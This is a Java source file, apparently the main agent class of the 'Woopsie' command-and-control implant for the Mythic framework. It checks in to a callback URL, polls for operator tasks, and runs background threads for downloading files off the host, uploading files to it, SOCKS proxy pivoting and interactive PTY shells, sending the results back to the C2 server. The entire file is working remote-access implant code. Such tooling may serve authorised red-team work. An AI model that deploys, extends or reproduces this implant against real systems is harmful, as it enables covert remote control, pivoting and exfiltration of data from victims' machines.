package com.woopsie;

import com.woopsie.tasks.BackgroundTask;
import com.woopsie.tasks.DownloadBackgroundTask;
import com.woopsie.tasks.PtyBackgroundTask;
import com.woopsie.tasks.UploadBackgroundTask;

import java.util.HashMap;
import java.util.Map;

/**
 * Main agent class for Woopsie C2 agent
 */
public class Agent {
    private final Config config;
    private final TaskManager taskManager;
    private final CommunicationHandler commHandler;
    private final Map<String, BackgroundTask> backgroundTasks;
    private volatile boolean running = true;
    
    public Agent(Config config) throws Exception {
        this.config = config;
        this.taskManager = new TaskManager(config);
        this.commHandler = new CommunicationHandler(config);
        this.backgroundTasks = new HashMap<>();
    }
    
    public void start() {
        // Perform initial checkin
        try {
            Config.debugLog(config, "Starting checkin to: " + config.getCallbackUrl());
            commHandler.checkin();
            Config.debugLog(config, "Checkin successful");
        } catch (Exception e) {
            Config.debugLog(config, "Checkin failed: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
            return;
        }
        
        // Main agent loop
        while (running && !taskManager.shouldExit()) {
            try {
                // Get tasks and SOCKS messages from C2
                Config.debugLog(config, "Requesting tasks from C2...");
                java.util.Map<String, Object> taskingResponse = commHandler.getTaskingResponse();
                String[] tasks = (String[]) taskingResponse.get("tasks");
                
                // Route SOCKS messages to background tasks first
                if (taskingResponse.containsKey("socks")) {
                    @SuppressWarnings("unchecked")
                    java.util.List<java.util.Map<String, Object>> socksMsgs = 
                        (java.util.List<java.util.Map<String, Object>>) taskingResponse.get("socks");
                    
                    if (!socksMsgs.isEmpty()) {
                        // Send the entire array to the background task (matches oopsie behavior)
                        java.util.Map<String, Object> bgResp = new java.util.HashMap<>();
                        bgResp.put("socks", socksMsgs);
                        routeToBackgroundTask(bgResp);
                    }
                }
                
                // Route interactive messages to background tasks
                if (taskingResponse.containsKey("interactive")) {
                    Config.debugLog(config, "Found 'interactive' key in tasking response");
                    @SuppressWarnings("unchecked")
                    java.util.List<java.util.Map<String, Object>> interactiveMsgs = 
                        (java.util.List<java.util.Map<String, Object>>) taskingResponse.get("interactive");
                    
                    Config.debugLog(config, "Interactive messages list size: " + (interactiveMsgs != null ? interactiveMsgs.size() : "null"));
                    if (interactiveMsgs != null && !interactiveMsgs.isEmpty()) {
                        Config.debugLog(config, "Routing " + interactiveMsgs.size() + " interactive message(s) to background tasks");
                        // Route each interactive message to its corresponding background task
                        for (java.util.Map<String, Object> interactiveMsg : interactiveMsgs) {
                            Config.debugLog(config, "Routing interactive message: " + interactiveMsg);
                            routeToBackgroundTask(interactiveMsg);
                        }
                    }
                } else {
                    Config.debugLog(config, "No 'interactive' key in tasking response");
                }
                
                if (tasks.length > 0) {
                    // Process all tasks and collect results
                    java.util.List<java.util.Map<String, Object>> results = new java.util.ArrayList<>();
                    
                    for (String taskJson : tasks) {
                        java.util.Map<String, Object> result = processTask(taskJson);
                        if (result != null) {
                            results.add(result);
                        }
                    }
                    
                    // Send all results back to Mythic and get background task responses
                    if (!results.isEmpty()) {
                        java.util.List<java.util.Map<String, Object>> bgResponses = commHandler.sendTaskResults(results);
                        
                        // Process any background task messages from Mythic
                        if (!bgResponses.isEmpty()) {
                            Config.debugLog(config, "Received " + bgResponses.size() + " background task messages from Mythic");
                            for (java.util.Map<String, Object> bgResp : bgResponses) {
                                routeToBackgroundTask(bgResp);
                            }
                        }
                    }
                }
                
                // Poll background tasks for responses and interactive messages
                java.util.List<java.util.Map<String, Object>> backgroundResponses = pollBackgroundTasks();
                
                Config.debugLog(config, "[DEBUG] backgroundResponses.size=" + backgroundResponses.size() + 
                    ", hasPendingInteractiveMessages=" + commHandler.hasPendingInteractiveMessages());
                
                // Send if we have responses OR pending interactive messages (PTY output, etc.)
                if (!backgroundResponses.isEmpty() || commHandler.hasPendingInteractiveMessages()) {
                    if (!backgroundResponses.isEmpty()) {
                        Config.debugLog(config, "Sending " + backgroundResponses.size() + " background responses");
                    } else {
                        Config.debugLog(config, "Sending interactive messages only");
                    }
                    java.util.List<java.util.Map<String, Object>> bgResponses = commHandler.sendTaskResults(backgroundResponses);
                    
                    // Process any additional background task messages
                    if (!bgResponses.isEmpty()) {
                        Config.debugLog(config, "Received " + bgResponses.size() + " additional background task messages");
                        for (java.util.Map<String, Object> bgResp : bgResponses) {
                            routeToBackgroundTask(bgResp);
                        }
                    }
                }
                
                // Check if exit was requested
                if (taskManager.shouldExit()) {
                    Config.debugLog(config, "Exit requested, stopping agent...");
                    break;
                }
                
                // Sleep based on jitter
                int sleepTime = config.getSleepInterval();
                Config.debugLog(config, "Sleeping for " + sleepTime + "ms...");
                Thread.sleep(sleepTime);
                
            } catch (InterruptedException e) {
                Config.debugLog(config, "Agent interrupted, exiting...");
                break;
            } catch (Exception e) {
                Config.debugLog(config, "Error in agent loop: " + e.getMessage());
                if (config.isDebug()) {
                    e.printStackTrace();
                }
            }
        }
        
        Config.debugLog(config, "Agent stopped");
    }
    
    private java.util.Map<String, Object> processTask(String taskJson) {
        try {
            Config.debugLog(config, "Processing task: " + taskJson);
            
            // Parse task JSON to extract task_id, command, and parameters
            com.fasterxml.jackson.databind.ObjectMapper mapper = new com.fasterxml.jackson.databind.ObjectMapper();
            com.fasterxml.jackson.databind.JsonNode taskNode = mapper.readTree(taskJson);
            
            String taskId = taskNode.get("id").asText();
            String command = taskNode.get("command").asText();
            String parameters = taskNode.has("parameters") ? taskNode.get("parameters").asText() : "";
            
            Config.debugLog(config, "Task ID: " + taskId + ", Command: " + command);
            
            // Handle background_task commands (messages to existing background tasks)
            if ("background_task".equals(command)) {
                return processBackgroundTask(taskId, parameters);
            }
            
            // Check if this command should be run as a background task
            if (isBackgroundCommand(command)) {
                return startBackgroundTask(taskId, command, parameters);
            }
            
            // Execute the task with proper parameters
            String output = taskManager.executeTask(command, parameters);
            
            // Check if the result indicates a background task should be started
            java.util.Map<String, Object> result = commHandler.createTaskResult(taskId, output);
            
            // If the result has a "download" field and no "completed", it's requesting background processing
            if (result.containsKey("download") && !result.containsKey("completed")) {
                Config.debugLog(config, "Task " + taskId + " requires background processing");
                return startBackgroundTask(taskId, command, parameters);
            }
            
            return result;
            
        } catch (Exception e) {
            Config.debugLog(config, "Task processing failed: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
            
            // Try to extract task ID for error reporting
            try {
                com.fasterxml.jackson.databind.ObjectMapper mapper = new com.fasterxml.jackson.databind.ObjectMapper();
                com.fasterxml.jackson.databind.JsonNode taskNode = mapper.readTree(taskJson);
                String taskId = taskNode.get("id").asText();
                return commHandler.createTaskError(taskId, e.getMessage());
            } catch (Exception ex) {
                // Can't even parse task ID, return null
                return null;
            }
        }
    }
    
    /**
     * Check if a command should be run as a background task
     */
    private boolean isBackgroundCommand(String command) {
        // Commands that require background processing
        return "download".equals(command) || "upload".equals(command) || "socks".equals(command) || "pty".equals(command);
    }
    
    /**
     * Start a background task in a separate thread
     */
    private java.util.Map<String, Object> startBackgroundTask(String taskId, String command, String parameters) {
        try {
            Config.debugLog(config, "Starting background task: " + command + " (ID: " + taskId + ")");
            
            com.fasterxml.jackson.databind.ObjectMapper mapper = new com.fasterxml.jackson.databind.ObjectMapper();
            
            if ("download".equals(command)) {
                // First, execute the download task to get initial metadata
                String output = taskManager.executeTask(command, parameters);
                
                // Check if output is an error (plain text starting with "Error:")
                if (output.startsWith("Error:") || output.startsWith("Unknown command:")) {
                    return commHandler.createTaskError(taskId, output.substring(output.indexOf(":") + 1).trim());
                }
                
                // Parse the download metadata from the initial response
                com.fasterxml.jackson.databind.JsonNode responseNode = mapper.readTree(output);
                
                // Check if there's a download key (success) or if it's an error
                if (!responseNode.has("download")) {
                    // Task failed, return error result
                    return commHandler.createTaskResult(taskId, output);
                }
                
                String fullPath = responseNode.get("download").get("full_path").asText();
                int totalChunks = responseNode.get("download").get("total_chunks").asInt();
                
                Config.debugLog(config, "Download metadata - path: " + fullPath + ", chunks: " + totalChunks);
                
                // Create the background task with metadata
                final BackgroundTask[] taskHolder = new BackgroundTask[1];
                final String finalFullPath = fullPath;
                final int finalTotalChunks = totalChunks;
                BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
                    new com.woopsie.tasks.DownloadBackgroundTask(taskHolder[0], config, finalFullPath, finalTotalChunks).run();
                });
                taskHolder[0] = bgTask;
                
                // Store the background task for later processing
                backgroundTasks.put(taskId, bgTask);
                
                // Start the background task thread
                bgTask.start();
                
                Config.debugLog(config, "Background download task started for: " + taskId);
                
                // Return the initial download response (without completed flag)
                return commHandler.createTaskResult(taskId, output);
            }
            
            if ("upload".equals(command)) {
                // First, execute the upload task to get initial metadata
                String output = taskManager.executeTask(command, parameters);
                
                // Check if output is an error (plain text starting with "Error:")
                if (output.startsWith("Error:") || output.startsWith("Unknown command:")) {
                    return commHandler.createTaskError(taskId, output.substring(output.indexOf(":") + 1).trim());
                }
                
                // Parse the upload metadata from the initial response
                com.fasterxml.jackson.databind.JsonNode responseNode = mapper.readTree(output);
                
                // Check if there's an upload key (success) or if it's an error
                if (!responseNode.has("upload")) {
                    // Task failed, return error result
                    return commHandler.createTaskResult(taskId, output);
                }
                
                String fullPath = responseNode.get("upload").get("full_path").asText();
                String fileId = responseNode.get("upload").get("file_id").asText();
                
                Config.debugLog(config, "Upload metadata - fullPath: " + fullPath + ", fileId: " + fileId);
                
                // Create the background task
                final BackgroundTask[] taskHolder = new BackgroundTask[1];
                BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
                    new UploadBackgroundTask(taskHolder[0], config, fullPath, fileId).run();
                });
                taskHolder[0] = bgTask;
                
                // Store the background task for later processing
                backgroundTasks.put(taskId, bgTask);
                
                // Start the background task thread
                bgTask.start();
                
                Config.debugLog(config, "Background upload task started for: " + taskId);
                
                // Return the initial upload response (without completed flag)
                return commHandler.createTaskResult(taskId, output);
            } else if ("socks".equals(command)) {
                // SOCKS proxy - start background task
                Config.debugLog(config, "Starting SOCKS background task");
                
                // Execute the socks task to get initial response
                String output = taskManager.executeTask(command, parameters);
                
                // Create the background task
                final BackgroundTask[] taskHolder = new BackgroundTask[1];
                BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
                    new com.woopsie.tasks.SocksBackgroundTask(taskHolder[0], config).run();
                });
                taskHolder[0] = bgTask;
                
                // Store the background task for later processing
                backgroundTasks.put(taskId, bgTask);
                
                // Start the background task thread
                bgTask.start();
                
                Config.debugLog(config, "Background SOCKS task started for: " + taskId);
                
                // Return the initial response (not completed)
                return commHandler.createTaskResult(taskId, output);
            } else if ("pty".equals(command)) {
                // PTY - start background task
                Config.debugLog(config, "Starting PTY background task");
                
                // Execute the pty task to get initial response
                String output = taskManager.executeTask(command, parameters);
                
                // Create the background task
                final BackgroundTask[] taskHolder = new BackgroundTask[1];
                BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
                    new com.woopsie.tasks.PtyBackgroundTask(taskHolder[0], config).run();
                });
                taskHolder[0] = bgTask;
                
                // Store the background task for later processing
                backgroundTasks.put(taskId, bgTask);
                
                // Start the background task thread
                bgTask.start();
                
                Config.debugLog(config, "Background PTY task started for: " + taskId);
                
                // Return the initial response (not completed)
                return commHandler.createTaskResult(taskId, output);
            }
            
            return commHandler.createTaskError(taskId, "Unknown background command: " + command);
            
        } catch (Exception e) {
            Config.debugLog(config, "Failed to start background task: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
            return commHandler.createTaskError(taskId, e.getMessage());
        }
    }
    
    /**
     * Process background_task messages from Mythic (messages TO existing background tasks)
     */
    private java.util.Map<String, Object> processBackgroundTask(String taskId, String parameters) {
        try {
            Config.debugLog(config, "Processing background_task message for: " + taskId);
            
            // Find the background task
            BackgroundTask bgTask = backgroundTasks.get(taskId);
            if (bgTask == null) {
                Config.debugLog(config, "Background task not found: " + taskId);
                return commHandler.createTaskError(taskId, "Background task not found");
            }
            
            // Parse and send the message to the background task
            com.fasterxml.jackson.databind.ObjectMapper mapper = new com.fasterxml.jackson.databind.ObjectMapper();
            com.fasterxml.jackson.databind.JsonNode paramsNode = mapper.readTree(parameters);
            
            Config.debugLog(config, "Sending message to background task: " + parameters);
            bgTask.sendToTask(paramsNode);
            
            // Return null - responses will come asynchronously from pollBackgroundTasks()
            return null;
            
        } catch (Exception e) {
            Config.debugLog(config, "Background task message processing failed: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
            return commHandler.createTaskError(taskId, e.getMessage());
        }
    }
    
    /**
     * Route a background task response from Mythic to the appropriate background task
     */
    private void routeToBackgroundTask(java.util.Map<String, Object> response) {
        try {
            com.fasterxml.jackson.databind.ObjectMapper mapper = new com.fasterxml.jackson.databind.ObjectMapper();
            com.fasterxml.jackson.databind.JsonNode messageNode = mapper.valueToTree(response);
            
            // Check if this is a SOCKS message (routed by command, not task_id)
            if (response.containsKey("socks")) {
                Config.debugLog(config, "===== ROUTING SOCKS MESSAGE =====");
                Config.debugLog(config, "SOCKS message content: " + response);
                Config.debugLog(config, "Active background tasks: " + backgroundTasks.size());
                
                // Find all active SOCKS background tasks
                int socksTaskCount = 0;
                for (BackgroundTask bgTask : backgroundTasks.values()) {
                    Config.debugLog(config, "Checking task " + bgTask.getTaskId() + " with command: " + bgTask.getCommand());
                    if ("socks".equals(bgTask.getCommand())) {
                        socksTaskCount++;
                        Config.debugLog(config, "Sending SOCKS message to task: " + bgTask.getTaskId());
                        bgTask.sendToTask(messageNode);
                    }
                }
                Config.debugLog(config, "Routed SOCKS message to " + socksTaskCount + " task(s)");
                return;
            }
            
            // Check if this is an interactive message (has task_id, message_type, and data)
            if (response.containsKey("message_type")) {
                Config.debugLog(config, "===== ROUTING INTERACTIVE MESSAGE =====");
                Config.debugLog(config, "Interactive message: " + response);
            }
            
            // Regular routing by task_id
            String taskId = (String) response.get("task_id");
            if (taskId == null || taskId.isEmpty()) {
                Config.debugLog(config, "Background task response missing task_id and not a SOCKS message");
                return;
            }
            
            BackgroundTask bgTask = backgroundTasks.get(taskId);
            if (bgTask == null) {
                Config.debugLog(config, "Background task not found for routing: " + taskId);
                return;
            }
            
            Config.debugLog(config, "Routing message to background task " + taskId + ": " + response);
            bgTask.sendToTask(messageNode);
            
        } catch (Exception e) {
            Config.debugLog(config, "Failed to route to background task: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
        }
    }
    
    /**
     * Poll all background tasks for responses (non-blocking)
     */
    private java.util.List<java.util.Map<String, Object>> pollBackgroundTasks() {
        java.util.List<java.util.Map<String, Object>> responses = new java.util.ArrayList<>();
        java.util.List<String> completedTasks = new java.util.ArrayList<>();
        
        // Collect interactive messages separately (they go at top level, not in responses array)
        java.util.List<java.util.Map<String, Object>> interactiveMessages = new java.util.ArrayList<>();
        
        for (Map.Entry<String, BackgroundTask> entry : backgroundTasks.entrySet()) {
            String taskId = entry.getKey();
            BackgroundTask bgTask = entry.getValue();
            
            // Poll for regular responses (non-blocking)
            java.util.Map<String, Object> response;
            int responseCount = 0;
            while ((response = bgTask.pollResponse()) != null) {
                responseCount++;
                responses.add(response);
            }
            if (responseCount > 0) {
                Config.debugLog(config, "Polled " + responseCount + " response(s) from task " + taskId);
            }
            
            // Poll for interactive messages (non-blocking)
            java.util.Map<String, Object> interactive;
            int interactiveCount = 0;
            while ((interactive = bgTask.pollInteractive()) != null) {
                interactiveCount++;
                interactiveMessages.add(interactive);
            }
            if (interactiveCount > 0) {
                Config.debugLog(config, "Polled " + interactiveCount + " interactive message(s) from task " + taskId);
            }
            
            // Only remove task if thread has actually died (not just marked complete)
            if (!bgTask.isAlive()) {
                Config.debugLog(config, "Background task thread died: " + taskId);
                completedTasks.add(taskId);
            }
        }
        
        // Store interactive messages for the CommunicationHandler to include at top level
        if (!interactiveMessages.isEmpty()) {
            commHandler.addInteractiveMessages(interactiveMessages);
        }
        
        // Remove completed tasks
        for (String taskId : completedTasks) {
            BackgroundTask bgTask = backgroundTasks.remove(taskId);
            if (bgTask != null) {
                bgTask.stop();
            }
        }
        
        return responses;
    }
    
    public void stop() {
        running = false;
    }
    
    public static void main(String[] args) throws Exception {
        // Parse configuration from compile-time baked properties
        Config config = Config.fromResource();
        Config.debugLog(config, "Loading configuration...");
        Config.debugLog(config, config.toString());
        
        // Create and start agent
        Agent agent = new Agent(config);
        
        // Setup shutdown hook
        Runtime.getRuntime().addShutdownHook(new Thread(agent::stop));
        
        // Start agent
        agent.start();
    }
}
